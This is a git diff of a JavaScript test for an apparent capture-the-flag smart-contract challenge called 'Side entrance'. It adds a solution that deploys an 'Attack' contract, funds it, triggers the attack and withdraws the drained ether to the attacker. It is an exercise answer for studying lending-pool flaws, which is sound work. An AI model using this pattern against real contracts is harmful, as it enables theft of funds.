@@ -1,5 +1,5 @@
 const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { expect, util } = require('chai');
 
 describe('[Challenge] Side entrance', function () {
 
@@ -25,6 +25,20 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const AttackFactory= await ethers.getContractFactory("Attack");
+        const Attack= await AttackFactory.connect(attacker).deploy(this.pool.address);
+        await attacker.sendTransaction({
+            to: Attack.address,
+            value: ETHER_IN_POOL, // Sends exactly 1.0 ether
+                });
+        await Attack.connect(attacker).attack();
+        console.log("balance of attacker contract",await ethers.provider.getBalance(Attack.address));
+        await Attack.connect(attacker).withdraw();
+
+
+
+
     });
 
     after(async function () {
